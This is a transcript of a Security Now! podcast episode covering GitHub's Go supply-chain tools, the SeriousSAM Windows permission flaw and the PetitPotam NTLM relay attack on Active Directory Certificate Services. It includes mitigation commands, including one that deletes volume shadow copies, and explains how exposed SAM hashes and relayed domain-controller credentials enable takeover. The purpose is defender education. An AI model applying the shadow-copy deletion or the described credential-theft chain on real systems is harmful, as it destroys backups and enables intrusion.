LEO:  Wow.  That's awesome.  I love it.  Yeah, so, yeah, I wonder if, yeah, I wonder if Mark Russinovich is aware of it.  That's hysterical.



STEVE:  Okay.  So last Thursday's GitHub blog posting was titled "GitHub Brings Supply Chain Security Features to the Go Community."  And it's very short.  They said:  "The global Go community embraced GitHub from the beginning, both as a place to collaborate on code and a place to publish packages, leading to Go becoming one of the top 15 programming languages on GitHub today.  We're excited to announce that GitHub's supply chain security features are now available for Go modules, which will help the Go community discover, report, and prevent security vulnerabilities."



And then commenting on GitHub's announcement, Google's Go Language, also GoLang, product lead, Steve Francia, he said:  "Go was created, in part, to address the problem of managing dependencies in large-scale software.  GitHub is the most popular host for open-source Go modules.  The features announced today will help not just GitHub users, but anyone who depends" - pardon the pun - "on GitHub-hosted modules.  We are thrilled that GitHub is investing in improvements that benefit the entire Go ecosystem, and we look forward to more collaborations with them in the future."



Okay.  So a little bit of background.  The Go Language itself is rapidly gaining ground with 76% of respondents in a developer survey last year, in 2020, saying that Go is now used in some form in the enterprise.  So more than three out of four are saying, yeah, we've got Go here.



Go's module system was introduced two years ago, in 2019, to make dependency management easier and version information more explicit.  And as a consequence, Go module adoption is also increasing.  96% of those surveyed said that these modules are used for package management, which was a 7% increase over the previous year, 2019.  And 87% of respondents reported that only Go modules are used for this purpose.  And an overall trend in the survey appears to suggest the use of other package management tools is consequently decreasing.  So Go did a good job with package management; and we're seeing, again, inertia is strong.  If what you're doing is not broken, the tendency is not to change it.  But we're seeing a drift, maybe like in this case 7% a year.



So GitHub's blog posting detailed four primary areas of improvement in supply chain security that are now available for Go modules.  The first is GitHub's advisory database, which is an open source repository of vulnerability information containing over currently 150 Go advisories.  And that number is growing every day as they curate existing vulnerabilities and triage newly discovered trouble.  The database also allows developers to request CVE IDs for newly discovered security issues.  GitHub also now provides the dependency graph, which can be used to monitor and analyze project dependencies through go.mod, as well as to alert users when vulnerable dependencies are detected.



And GitHub has introduced Dependabot in this update, which will proactively, and I love this, send developers a notification  when new vulnerabilities are discovered in Go modules that affect their projects.  I'm sure our listeners all know how great I think it is that we're talking about proactive notification.  You know, developers will still need to seriously heed any notifications they receive.  But it's not possible to heed notifications that you never receive.



So this is certainly a step in the right direction.  And being proactive, I think, that is the future.  Automatic pull requests can be enabled to patch vulnerable Go modules, and notification settings have been updated for fine-tuning.  GitHub said that when repositories are set to automatically generate pull requests for security updates, dependencies tend to patch up to 40% faster than when they're not set automatically.  And actually, I would think that would be even better than that.  But, you know, yay.



So, you know, we've talked, I would guess I would say incessantly on this podcast, about the power that automated and automatic background updates have to rapidly remediate security vulnerabilities.  Whenever I do this, I'm reminded by some of our intrepid listeners that with automation comes some risk of subversion.  And, yes, that's inarguably true.  But, for example, this month alone Microsoft patched 117 flaws, nine of which were zero-days.  Four of those were being actively exploited in the wild.  As it is, Windows, as we've been talking about so far, is barely holding together.  It's not possible any longer to conceive of a world without Windows automatic updates, where as it was once upon a time, every individual end user was obligated to go get and manually install Windows updates onto their own systems.  Can you imagine that today?



And those old-timers among us can probably recall the controversy that surrounded Microsoft's decision, back when they made it, to take that job out of our hands.  Cranky old guys who were still imagining that they had any real control objected to the idea that their beloved hand-built machines might be changed without their prior approval and oversight.  Uh-huh.  Well, we had to get over it.  That day has long since passed.  And I believe we're headed much farther down that path.  Like it or not, warts and all, it's the right path for us to take.



In time, I think it's going to become just as clear that the only way for complex, multi-component, multi-sourced software to be built and maintained will be for similar dependency graph-driven automated supply-chain management become standard operating procedure.  Developers are just as busy as end-users, if not more so.  And yes, it's true that automated supply-chain management brings risk of supply-chain attack.  But we're heading in with our eyes open, and this is not the first time we've done this sort of thing.  Automating the entire software lifecycle, from the developer's fingers on the keyboard, writing the code, all the way out to code running on machines, even IoT devices, creating the ability to write and publish incremental updates which then securely flow all the way out as binary updates everywhere that code appears, anywhere in the world, is where we need to eventually arrive.



And yes, it will create a mess.  It will be a mess of overhead that we do not yet have today.  As an analogy, look at what a mess the addition of secure boot has created, an incredible amount of overhead that's beginning to appear in every system to address a problem that almost none of those systems will ever have.  But it's there everywhere.  And what does it do?  All it does, when it isn't being bypassed, is attempt to assure that every step of the operating system boot process uses verifiably signed code.  That's it.  But it's a mess.



In the future, we're going to muck up our development processes similarly because we have no choice.  It's going to be a mess, too.  But I think it's as inevitable as was allowing Windows to update itself.  It's just not possible, Leo, to imagine a world where the end-users of Windows today are like responsible for keeping their systems secure.  Thank god Microsoft did that back then, even though it did annoy those of us who used to know what the files on our hard drives actually did.



One quick note.  Someone tweeted whose Twitter name is JF.  He tweeted from @jfparis.  And he said:  "Hi, @SGgrc.  I listened to you repeatedly trashing QNAP over several shows.  Quality of their software is doubtful, I agree.  But unlike many of their peers, it is relatively easy to replace it with a clean Linux distro."  And so I just wanted to reiterate that.  We've mentioned it before.  I wanted just to, since it popped up in my Twitter feed, I thought, yeah, that's worth just reminding people.  It's like, you know, if you have a QNAP machine, I would argue, get it off the Internet.  I mean, hopefully you've taken that advice a long time ago.  But the fact that it can receive a standard Linux or Unix or some distro means you could give it a well-maintained, far more security-hardened platform for the future, and that it's probably worth doing.  And lots more capabilities.



LEO:  But in your defense, that would be like not criticizing Windows because, well, you can always install Linux on that PC.  You know.



STEVE:  Well, no.  I guess I would not criticize a laptop because you could scrape Windows off of it and put Linux on it.



LEO:  Right, yeah.  Or desktops, too.  Yeah.  I mean, but you criticize Windows because it's Windows.  And when you talk about QNAP, you're not just talking about the hardware, you're talking about the software, yeah.



STEVE:  Right, that's a good point.  That's a good point.  Okay.  SeriousSAM & PetitPotam.  The first of these two new problems with Windows was just developing, as I mentioned at the top of the show, as last week's podcast was being produced.  We noted last week that it had been preliminarily named "HiveNightmare" since we were all in a "nightmare" mode following the many recent printer nightmares of the month.  But since then, the name SeriousSAM appears to have taken root, SAM being the abbreviation for Windows' Security Account Manager (SAM).  And I prefer this name since the trouble is entirely separate from any printer-related trouble.  Unfortunately, "Serious Sam," as you mentioned, Leo, is also the name of a 20-year-old, and still...



LEO:  Very good game.



STEVE:  ...relevant, first-person shooter.



LEO:  It's really good.



STEVE:  Yeah.  And googling just the phrase "Serious Sam" will return lots of gaming hits rather than any security information.



LEO:  Lot of nostalgia, yeah.



STEVE:  So anyway, we will take a look at this.  Last Monday, on the 19th, security researchers began reporting that the Security Account Manager file on Win10 and 11 was READ-enabled for all local users.  That was quite deliberately never true of Windows before 10.  It's not good, and it is a critical security mistake.



The Security Account Manager file, as its name suggests, stores sensitive security information including storing and caching all of the hashes for the user and admin passwords the system is aware of.  Having this file's security access rights enabled for read access by everyone means that attackers with any access to the system can use this SAM file information, which they should never be able to read, to escalate privileges or access other data.  In other words, it's a big no-no.



The next day Tuesday, that is, the following day, the next day on Tuesday, Microsoft immediately issued an out-of-band advisory for this vulnerability, which is now being tracked as CVE-2021-36934.  And as of last Thursday, the vulnerability has been confirmed to affect Windows 10 version 1809 and all later, as well as Windows Server 2019 and all later, including 20H2.



A public proof of concept is available that allows non-admin users to retrieve all registry hives.  And researcher Kevin Beaumont, who tweets as @GossiTheDog, has released a demo that confirms that it's both possible and practical to obtain local hashes and pass them to a remote machine to achieve remote code execution as SYSTEM on arbitrary targets in addition to privilege escalation.  In other words, ow.



CERT's Coordination Center has published detailed vulnerability notes on this CVE titled "Microsoft Windows gives unprivileged user access to system32\config files," meaning that directory.  They said:  "Multiple versions of Windows grant non-administrative users read access to files in the C:\Windows\system32\config directory.  This can allow for local privilege escalation.  With multiple versions of Windows, the BUILTIN_Users group" - okay, so that's the group, in terms of the Windows Access Control management, which has been given read-execute permissions to files in that system32\config directory.  So it's the built-in users group.



If a VSS shadow copy - VSS shadow copy is the system which allows the snapshotting of an in-use file system so that a moment in time can be captured.  Then Windows can continue reading and writing to the file system while that captured moment in time can be compressed or an image can be made of it, or it can be spooled off somewhere and so forth.  That's VSS shadow copy.  So they said, you know, and also that's the system, like a snapshot is made before you apply a Windows Update every month so that, if it caused a complete collapse of your system, you're able to roll back the changes that were made after that snapshot of the file system was taken.



So they said:  "If a VSS shadow copy of the system drive is available" - which almost always will be as a consequence of the fact that they're often being taken - "a non-privileged user may leverage access to these files" - which again they should never have access to - "to achieve a number of impacts, including but not limited to extract and leverage account password hashes; discover the original Windows installation password; obtain DPAPI computer keys, which can be used to decrypt all computer private keys."  DPAPI is Windows Data Protection API, which has been part of Windows since Win2000.  It offers Windows clients various simple and straightforward cryptographic services.  Windows makes use of its own API, this DPAPI, to protect various of its own sensitive local private key stores.  But as always, the master key must be around somewhere.  This flaw makes it available.  And, finally, "obtain a computer machine account which can be used in a so-called 'silver ticket' attack."



Okay.  So the VSS shadow copies may not be available in some configurations.  However, as long as your system has a drive larger than 128GB, when you perform a Windows Update or use Windows setup to install an MSI package file, a VSS shadow copy will be created automatically to allow a system change roll-back.  Okay, so here's some cool things.  To see whether your system, any Windows system, has one or more VSS shadow copies available, you can issue the following command from a privileged command prompt.  So you'll want to right-click on command prompt, then select Launch or Use As Administrator.  That'll give you an administrative command prompt.  Then use the command vssadmin (V-S-S-A-D-M-I-N) space list space shadows.  It'll say none available, or it'll list them.  Okay.  So that's the first thing, do you have shadows available?



To check if a system is vulnerable, that is, if your system right now is vulnerable to this, from a non-privileged command prompt, because you want this to fail because you're asking the question without privilege, you type the command icacls, again icacls, and then the path name to the SAM file.  So that would be your Windows directory, typically it's C:\Windows\system32\config\sam.  So icacls, space, and then the path to the SAM file.



If it succeeds, it will print out a bunch of stuff ending in "Successfully processed 1 file, failed processing 0 files."  Again, from a non-privileged command prompt, that would tell you that your system is right now vulnerable.  That is, your built-in users Windows ACL privilege has this read-execute privilege, which you should not have.  That was a mistake.  If you are told when you do this that that path repeated, and then access is denied, "Successfully processed 0 files, failed processing 1 file," that is, Windows was unable to access the ACLs for that, as it should not be able to, that's good.  That means your system is safe.  So that would allow you to verify.



There's currently no patch from Microsoft for this trouble, though I'll be surprised if we don't see something soon because this is big.  In the meantime, Microsoft did release remediation guidance for Windows 10 and 11 users which mitigates the risk of immediate exploitation of this.  For the measures to be effective, it's necessary to first restrict access by changing the ACLS, and then delete any existing shadow copies.  Because they will be copies of a pre-ACL fixed system, you don't want anyone to have access to those.  If you needed to, you could create a replacement shadow copy immediately after that.



So anyway, the way to do this, and I've got all of this, by the way, in the show notes if anyone can't find it online, you would open up a command prompt or a PowerShell with admin rights.  And then you run the following command:  icacls, space, and then a path to the config\*.*.  So C:\Windows\system32\config\*.*, then space /inheritance:e.  Hit ENTER, problem solved.  So it is trivial to fix this problem.  So it can't take Microsoft long to just push out something.  Maybe they'll even do it again through Windows Defender because they're constantly updating that, and just fix the permissions on all the files in that directory.



Once you've done that, then you delete any volume shadow copies that you may have.  It turns out that's also easy to do.  I've got that in the show notes.  It's vssadmin space delete space shadows, and then some command prompt parameters that I'll let you look up.  Again, the very bottom of page 11 of the show notes.  Then you probably want to go back and do the vssadmin list shadows to confirm that they're all gone.  Now you're safe.  And at this point, if you wanted to, you could manually take a snapshot.  But on the other hand, next time anything does anything to your system that needs the ability to roll back, you'll have one.



So it would really be interesting to know what happened.  You know, was this a change made during development that they forgot to change?  Was there something they were going to do where they meant maybe to change one file, but they changed all of them in the directory?  I mean, how do you account for this?  It's just amazing.  But it also sort of suggests that there is a lack of regression testing that ought to be in place.  You'd think that a new installation would have regression tests run against it to make sure that exactly this kind of thing hasn't happened.  But somehow that didn't happen since the release of Windows 10.  And again, this is another one of these problems.  Since Windows 10, what was that, that very first build, this has been wrong.  And anybody with no privileges could get in, and into something that they should absolutely be excluded from.  Yet they've been able to.  So is it any surprise that we've been seeing the kinds of problems we have been?



Okay.  Next one is PetitPotam, a French-based, I mean, a Paris-based French security researcher whose GitHub handle is topotam, and who appears to have a thing for hippopotamuses, Leo.  We'll get to that in a second, yeah.  That's from his GitHub page.  He recently discovered and went public with, like what day is it, another serious security flaw in Windows which can be exploited to force remote Windows servers to authenticate with an attacker, thus sharing their NT LANMAN authentication details and certificates.  Okay, no, given that this researcher's GitHub page shows a bunch of apparently quite happy and sort of adorable hippopotamuses, it appears that the Potam of PetitPotam is meant to put us in mind of a small hippopotamus.



Okay.  So what's the new problem?  The trouble surrounds a means of abusing Microsoft's MS-EFSRPC Protocol - EFS as in Encrypted File System, and RPC as in Remote Procedure Call.  So MS-EFSRPC.  It's the network protocol which enables Windows machines to perform operations on encrypted file system data, stored on remote encrypted NTFS-based systems.  But an encrypted file system is not required for this attack to work, just the protocol.  The PetitPotam attack proof-of-concept code allows an attacker to send SMB, our good old friend Windows File and Network Printer Sharing and all that over 445 port, requests to a remote system's MS-EFSRPC endpoint interface, to cause the target victim computer to initiate an authentication procedure and thus share its authentication details.



Attackers can collect this data and abuse it as part of an NTLM relay attack, you know, NT LANMAN, right, LAN Manager, relay attack, to gain access to remote systems on the same internal network.  PetitPotam cannot be exploited remotely across the Internet, thank god, you know, thank goodness.  It's an attack that's designed to be used inside large corporate networks where attackers could use it to force domain controllers to cough up their NTLM password hashes or authentication certificates.  This could then in turn lead to the complete takeover of a company's internal network.  So we can see why Microsoft responded with surprising speed to the new threat created by this public publishing of a proof of concept.



Okay.  So there's a related exploit using MS-RPRN, okay, MS-RPRN.  That's their print service remote protocol, though the developer of the PetitPotam exploit tweeted Sunday before last on the 18th when it first pointed the world to his discovery.  So he said:  "Hi all.  MS-RPRN to coerce machine authentication is great, but the service is often disabled nowadays by admins on most orgs.  Here" - and this is the birth of the PetitPotam.  "Here," he tweeted, "is another way we use to elicit machine account auth via MS-EFSRPC.  Enjoy!! :)."  And then a link to his GitHub page.  This was earthshaking.



In response to that, four days later, another researcher replied:  "Finally finished testing it.  It's quite brutal!  Network access to full Active Directory takeover."  He said:  "I really underestimated the impact of NTLM relay on PKI #ESC8.  The combo with PetitPotam is awesome!  Everything is already published to quickly exploit it."  Which, yeah, is exciting these guys, but it's a disaster for the enterprise.  "Tests carried out by multiple security researchers have shown that disabling support for MS-EFSRPC did not stop the attack from working.  It has been tested against Windows Server 2016 and Windows Server 2019 systems, but security researchers believe PetitPotam impacts most Windows server versions supported today."  In other words, so far it has affected all that they've tested.



Florian Roth, the Head of Research at Nextron Systems, was quoted in The Record saying:  "The problem with this type of attack is that it will take a considerable amount of time and consideration to develop appropriate countermeasures.  These are design flaws that are more difficult to fix.  It's much easier to just patch a vulnerable font driver DLL or Internet Explorer library."  In other words, we're here again with a fundamental flaw in a core Windows protocol where whatever fix is found must also not break existing facilities.  Again, it's not a bug, it's a feature.  But it's a bad feature.



The TrueSec, TrueSec.com, has a blog posting where they describe in a little more detail exactly how this happens.  And it will certainly make any of our corporate listeners sit up and take notice.  Hopefully all that they'll be doing when they're hearing this on the podcast is going, yeah, yeah, yeah, did it all right.  Here's what TrueSec said:  "This advisory" - that is, theirs - "is related to the recent Certified Pre-Owned whitepaper discussing the possible abuse of the Active Directory Certificate Services," and then they said, "AD CS role in combination with Credential Relay Attacks such as MS-RPRN and the more recent MS-EFSRPC aka PetitPotam.



"The MS-EFSRPC protocol can be used to coerce any host, including Domain Controllers, to authenticate to a specific destination.  The designated destination then forwards the NTLM" - again, NT LANMAN - "credentials to another device that is configured to accept the Domain Controller's certification, resulting in an abuse of those services.  An attacker can target a Domain Controller to send its credentials by using the MS-EFSRPC protocol and then relaying the DC NTLM credentials to the Active Directory Certificate Services AD CS Web Enrollment pages to enroll a domain controller certificate.  This will effectively give the attacker an authentication certificate that can then be used to access domain services as a domain controller and compromise the entire domain.



"AD CS is especially interesting as it offers role services that by default accept NTLM-based authentication."  Let me repeat that because that's going to come back in a minute.  "Active Directory Certificate Services is especially interesting as it offers role services that by default accept NT LANMAN-based authentication."  Then they finish:  "The Certificate Authority Web Enrollment and Certificate Enrollment Web Service can be abused to issue certificates by performing NT LANMAN Relay Attacks using MS-EFSRPC, MS-RPRN or other API that offer similar behavior."



Okay.  So I'm going to conclude with a couple of points and observations.  First, this is of no concern for end-user Windows people.



LEO:  Oh, should have said that upfront.  Oh, geez.  Could have saved me a lot of acronyms.



STEVE:  This is entirely a high-end enterprise worry when an organization is running with Domain Controllers and Active Directory Certificate Services.  So if you don't already understand all of this, if you don't understand that you're not vulnerable, I mean, I'm sorry, if you don't...



LEO:  You're definitely not.



STEVE:  ...already understand that you are - if you don't understand that you might be vulnerable...



LEO:  Right.



STEVE:  ...you definitely aren't. 



LEO:  Definitely not, yeah.



STEVE:  Right.



LEO:  If you don't know what a domain controller is, you're fine.



STEVE:  You're fine.  Second, when exploited, it provides a means for an attacker who is already present on the victim's network to fully compromise and take over the entire operation.  That's obviously not good because it completely collapses all security containment, enterprise-wide.  But it is at least constrained to be a local-only attack.



Okay.  Now, in response to this, Microsoft immediately blamed their old, but still widely used and enabled-by-default NTLM (NT LANMAN) protocol.  I have a link to what they said in the show notes.  I've excerpted for the podcast.  "Microsoft is aware of PetitPotam, which can potentially be used in an attack on Windows domain controllers or other Windows servers.  PetitPotam" - this is Microsoft writing - "is a classic NTLM Relay Attack, and such attacks have been previously documented by Microsoft, along with numerous mitigation options to protect customers."



Continuing, they write:  "To prevent NTLM Relay Attacks on networks with NTLM enabled, domain administrators must ensure that services that permit NTLM authentication make use of protections such as Extended Protection for Authentication (EPA) or signing features such as SMB signing.  PetitPotam takes advantage of servers where the Active Directory Certificate Services (AD CS) is not configured with protections for NTLM Relay Attacks.  The mitigations below outline to customers how to protect their AD CS servers from such attacks."  And then Microsoft goes on to describe what needs to be changed, disabled, and blocked to thwart this attack.



Okay.  Now, note that Microsoft calls it a "classic NTLM relay attack," as if everyone should be aware that NTLM, which they once believed to be fabulously secure, has become so completely broken that attacks on it are considered to be classic, like Coke.



LEO:  Oh, yeah, of course.



STEVE:  And that as a result of NTLM's fully acknowledged crap security, it should never be used unless there's really no other choice.  Except for this.  Now, I'm quoting an imaginary, fully forthcoming Microsoft saying:  "You just bought a brand new server for your enterprise, and we've just installed a bunch of old and insecure crap on all of your servers, just in case they might need to connect to something else that you may have lying around that's also old and insecure.  To eliminate any confusion about why all this complex stuff might not be working, we turned everything on, and it's fully enabled, so that your shiny new systems would just work out of the box without you needing to learn anything about them, or even wonder for a minute why you couldn't just plug everything in and have it all go.  So it does.  Because we're Microsoft, 'Vulnerable by Design.'"



LEO:  Oh, lord.  Sigh.



STEVE:  Leo, what's sad is it's true.



LEO:  Yeah, there's no reason why that should be turned on.



STEVE:  It's true.



LEO:  Probably not even included.



STEVE:  I'm not making this up.



LEO:  If you need it, you could download it.



STEVE:  No, no, it's included.



LEO:  Yeah, that's ridiculous.



STEVE:  That's why everybody has it.  That's why it's a big worry.  Microsoft literally has their systems designed with everything on because they don't want a phone call.  They don't want somebody wondering what this error message means.  They just want it to all work.  So it's up to the admin to go in and, oh, yeah, what about those classic NT LANMAN relay attacks?  Shall we do something about that?  Are they still classic?



LEO:  Oh, god.



STEVE:  It's just painful.



LEO:  Yeah.  No, you're absolutely right.  There's no reason to include it, let alone include it and turn it on, when 90% of people never use it.



STEVE:  Enabled by default, Microsoft said in their bulletin.



LEO:  Well, it keeps people in business.  That's why we can never stop hiring IT professionals.  So that's a good thing.



STEVE:  Like I said, the digits this podcast requires are going to push that little tag at the bottom of the screen right off to the right, Leo.  I'm going to come up with - because the episode numbers are going to have so many digits there won't be room for...



LEO:  Just a number.  That's all we need.  Just a number.



STEVE:  That's right.



LEO:  Steve, you've done it again.  A number of people in the chat are saying, "And this is why we listen to Security Now!."  You're absolutely right.  It's unconscionable.  It's unconscionable.  Steve does his thing at GRC.com.  That's his website.  That's where you'll find SpinRite, world's best mass storage maintenance and recovery utility.



STEVE:  It's rolling right off your tongue, Leo.



LEO:  Yeah.  It's currently at 6.0.  6.1 is coming.  You can participate in the development and get a free copy if you buy right now, GRC.com.  While you're there, check out all the other things Steve has for you, including this show, 16Kb as well as 64Kb audio versions of the show; really nicely written transcripts, so you can read along while you listen, or search, which is a great feature.  He also has a feedback form there, GRC.com/feedback.  But another way to get him, and I think probably the easiest would be to slide into his DMs on Twitter.  His Twitter handle is @SGgrc, and his DMs are open.



We have 64Kb audio plus video versions of the show at our site, TWiT.tv/sn.  You can also subscribe in your favorite podcast player.  That way you'll get it automatically.  In fact, do me a favor.  If you're doing that, leave a five-star rating and a review for us.  Let the world know about Security Now!.  It's very helpful to us.  We also have a YouTube channel dedicated to Security Now!.  Lots of ways to consume it.  Make it easy.



We do this show Tuesdays, right after MacBreak Weekly.  That's usually around 1:30 Pacific, 4:30 Eastern, 20:30 UTC.  You can watch us do it live.  There's a stream, audio or video, at TWiT.tv/live.  If you're watching live, of course, it's great to chat live.  There's a free chatroom at irc.twit.tv, along with a Discord chatroom.  And we'd love to see you join us during the live program.  The chatroom is always a great part of the show.  Steve, have a wonderful week, and I'll see you next week.



STEVE:  Thank you, my friend.  Right-o.  Bye.



Copyright (c) 2021 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#830

DATE:		August 3, 2021

TITLE:		The BlackMatter Interview

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-830.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we look at Firefox's declining active user count, at the evolution of the Initial Network Access Broker world, and at several different ransomware group renamings and revivals.  We encounter a well-informed Active Directory security researcher who feels about Microsoft's July pretty much as we do.  I want to turn our listeners on to a very interesting-looking Hamachi-esque overlay for WireGuard, and share a fun diagnostic anecdote that cost me a day of work last Friday.  We have a bit of closing-the-loop feedback from a couple of our listeners.  Finally, we're going to share an interview with a member of the "maybe new or maybe rebranded" ransomware group BlackMatter which Recorded Future posted yesterday.



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here with bad news about Firefox and a plea to turn the bad news around.  We'll also talk about a new critical feature in the infrastructure of ransomware attacks.  It's called the IAB.  And then an interview with BlackMatter.  It sure sounds like the return of DarkSide.  It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 830, recorded Tuesday, August 3rd, 2021:  The BlackMatter Interview.



It's time for Security Now!, the show where we cover your security and privacy online with this man right here, Steve Gibson of Gibson...



STEVE GIBSON:  Ho.



LEO:  Hey, of GRC.com.  Hello, Steve.



STEVE:  Leo?



LEO:  Yes?



STEVE:  This is the - and I'm using this word advisedly because I misused it once, and I've never heard the end of it.



LEO:  Let me guess.  Penultimate.



STEVE:  That's the word.  Yes.



LEO:  But wait a minute.  I can't guess what it's the penultimate of.



STEVE:  This is the penultimate episode of Year 16.



LEO:  Oh.



STEVE:  Of the podcast.



LEO:  We're coming up on an anniversary.



STEVE:  We are.



LEO:  That's hard to believe.  That's amazing.  17 years old.



STEVE:  We look a little different than we did back then.



LEO:  Wish we looked like 17 year olds.



STEVE:  I saw a picture of you on one of the TWiT thumbnails.  And I thought, who is that?  And I said, oh, that's supposed to be Leo.



LEO:  Yeah, a long time ago.



STEVE:  It was one of those cartoon ones, and I never really was that pleased with mine, either.



LEO:  We never got them updated.  But we do sell that mug of you looking cocky.  Quite a few of them, actually.  



STEVE:  Yeah, I'm quite cocky today.  Do we still have the mask on me?  Or did that come off?



LEO:  Oh, that's a good question.  Anthony, have we removed masks from the album art yet?  I don't remember.  If we did, we have to put them back on again because we have been instructed by the County Health Department that we all have to mask up again in the studio.



STEVE:  Well, thank goodness that a biological virus cannot crawl through the audio link that you and I have, or I'd be further away from the microphone than I am, like kissing it right now.



LEO:  Actually, don't tell anybody, but I kind of am glad because remember this studio was inside the cordon sanitaire.  No one could come in here.  And then when the mask mandate went away, and everybody came back to the office, people started coming in here.  And now they can't come in here again.  I like it.



STEVE:  Well, and you get to have Padre on the Sunday show and not have him feel like a third-class citizen because he's not there with everybody else.



LEO:  Everybody's on Zoom now, yup.  Everybody's back on Zoom, sad to say.  So what's the matter of the moment?



STEVE:  This is, I think, going to be fun.  I've got a lot of stuff to talk about.  Security Now! Episode 830.  And as I said, second to the last of our 16th year.  Yesterday the security group Recorded Future posted an interview they conducted with an individual from maybe an upstart, but we don't think so, ransomware group known as BlackMatter.  So what I found interesting about this, there's not a lot of new detail.  But the interview was conducted by a Russian-speaking member of Recorded Future, speaking to a Russian member of Black Matter.  Then it was professionally translated into English.  So it doesn't read like pidgin English.  It's well translated.  But you get, well, our listeners will see, a sense of the attitude which I think is really interesting of, like, how these people see themselves in the world, and some recent history of what's been going on in the ransomware business.



But before we get to that, we're going to be talking about some evidence we have of where BlackMatter came from and why there's strong, strong evidence that this is the reemergence and rebranding of DarkSide.



LEO:  Oh, boy.



STEVE:  The group that of course made the mistake of hitting the Colonial Pipeline operation and shutting down the U.S. Eastern Seaboard's petroleum supply.  And that did not work out well for them.  But lots more to talk about.  We're going to look at, and I heard you mention this somewhere recently, so I went and tracked it down because I was curious, Firefox's declining active user count.



LEO:  Yeah, yeah.  Disappointing, I'm sorry to say.



STEVE:  Yes.  The evolution of the initial network access broker world, those are the guys who are now, in this increasingly specialized ransomware industry, the guys who are only doing the initial penetrations and then turning around and offering them for sale to ransomware groups to then monetize them.  We've also got several different ransomware group renamings and revivals.  And we encounter a well-informed Active Directory security researcher who I was glad to say, or see, feels about Microsoft's July pretty much as we do.  So that was sort of fun.  I also want to turn our listeners on to a very interesting-looking Hamachi-esque overlay for WireGuard, and share a fun diagnostic anecdote that cost me a day of work last Friday.



LEO:  I love your diagnostic stories, by the way.  Keep those up.



STEVE:  Well, I got a lot of positive feedback from the last one.



LEO:  Yeah.  



STEVE:  So I thought, you know, this happened.  I posted all the details to the GRC spinrite.dev news group by way of introducing the next increment of, like, where I am.  And I thought, yeah, it'd be fun to share that.



LEO:  Oh, good.



STEVE:  Also we've got a bit of closing-the-loop feedback from a couple of our listeners.  And then we're going to look at the BlackMatter 'tude.



LEO:  I look forward to the BlackMatter 'tude.



STEVE:  Oh, and Leo, a Picture of the Week.  It's not - nothing will ever top that ground wire stuck into a bucket of dirt.  That's, to me, that's got to be - that's a classic for all time.



LEO:  Although that one could have been a setup.  There's no way this is fake.



STEVE:  No.



LEO:  No way.



STEVE:  I just gave this the caption, "How does this happen?"



LEO:  Yeah.



STEVE:  Because, you know...



LEO:  You can't fake this one.  This is clearly real.



STEVE:  Maybe someone's alive in there.  That's a frightening thought.



LEO:  Okay.  We don't know, but we'll find out in just a little bit, the Picture of the Week.  Okay, Steve.  This is the picture.  I'm ready.  Fire away.  Did you take this in our server room, I'm asking, I'm wondering?



STEVE:  So I did learn a lesson during some of my early equipment setup.  There's a tendency when you're a newbie to go overboard with the tie wraps, to determine the optimal length for every cable and get that length of network cable and plug it in each end, like route it carefully around.



LEO:  I used to have Colleen custom-make cables so they'd be just the right size.



STEVE:  Right, right.



LEO:  No excess, yeah.



STEVE:  Right.  And then you want to kind of gather them as they go along with successively larger wraps to create a bundle, and then route the bundle down, blah blah blah.



LEO:  Yeah, tidy, yeah.



STEVE:  And inevitably you get that all done, it's like, oh, look.  I mean, it is the most beautiful thing...



LEO:  It's gorgeous.



STEVE:  ...you've ever seen.



LEO:  And if I showed you our current server room, you would say that because they really did a good job.  But in the first days of the old studio, everything was like, plug it in, quick.  Get it going.  We only gave them a few hours for the move.



STEVE:  Well, and the problem with that kind of beautiful work is when you have to change something.



LEO:  Yeah.  It's not very flexible.



STEVE:  Because change inevitably occurs.  Now, at the opposite side of that spectrum, we have this, where change is also a problem.



LEO:  Yeah, actually that's true.  This is no more flexible, is it.  Because you have no idea what's going to what.



STEVE:  No.  And the problem is when a port dies, like, deep inside that nest.  So I feel more sorry that we have non-video, non-visual listeners for this than I can remember feeling because I cannot adequately describe.  I can describe the fence planted out in the middle of the desert that's locked with the car tracks running around on either side of it, which, you know.  But I can't describe this picture, I mean, except to say it is the most godawful, like, insane cable room.  I just, you know, it is worth for our listeners who don't normally bother with the show notes.  This is Episode 830.  Get the show notes and look at this picture.



LEO:  This picture, yeah.



STEVE:  And again, I captioned it "How does this happen?"  Because this...



LEO:  I know exactly how it happened because...



STEVE:  This demonstrates a lot of...



LEO:  I mean, it wasn't this bad in the old studio.  But if you're in a hurry, and you've got to get stuff connected so you can operate - still, this is pretty bad.



STEVE:  Leo, yeah.  I mean, this feels like it is the evolution or devolution of what was once organized.  I mean, look at the very bottom there.  There's a little white bundle.



LEO:  Oh, there is a bundle, yeah.



STEVE:  Like kind of going off by itself.



LEO:  At one point, yeah.



STEVE:  It's like, you know...



LEO:  And the bundles in the rack are tied together, the cables.



STEVE:  Now, apparently the aesthetic taste of the person is reflected in the chair that we can see in the foreground.  So the chair might go a long way to explaining the rest of this because, whoa.



LEO:  Yeah, yeah, a little optical art.



STEVE:  Anyway, this was tweeted to me by one of our listeners.  I will thank you forever.  This is one for the ages.  This is quite something.



LEO:  Yikes.  That's amazing.  And you know it's not fake because it would take so much time to make that rat's nest.



STEVE:  No, in fact, there are some lights on in there.  They're lonely, but they're in there.  And, oh, lord.  And god help you if you have to change something, if like a port dies or someone moves their office to somewhere else.



LEO:  Oh, yeah.



STEVE:  It's like, well, Marybeth is now on the third floor, and so she needs her network connection moved.  Uh, well, okay.



LEO:  You sure?  Can we just move the floor?  It might be easier.



STEVE:  Exactly.  Okay.  So I was concerned when I heard you, I guess it was on Sunday, talking about the news that Firefox had lost on the order of 50 million of what they call their Monthly Active Users, MAUs.  It turns out that number is 56,003,700.  So a 56,003,700 users drop from the peak shown in the chart that they're tracking, which was at - and this is the good news.  It's not like it's 56 million out of 57 million, so like there's only one million left.



LEO:  No, but it's a pretty good portion of the total.



